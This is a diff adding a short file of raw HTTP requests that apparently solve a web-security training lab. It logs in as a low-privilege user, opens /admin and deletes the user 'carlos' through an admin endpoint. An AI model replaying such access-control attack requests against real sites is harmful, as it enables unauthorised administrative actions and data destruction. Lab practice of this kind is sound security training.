@@ -1,0 +1,7 @@
+POST /login HTTP/1.1
+
+csrf=ovZEtTjYFNDt9dynb6ppWckvWreQRWsq&username=wiener&password=peter
+
+GET /admin HTTP/1.1
+
+GET /admin/delete?username=carlos HTTP/1.1
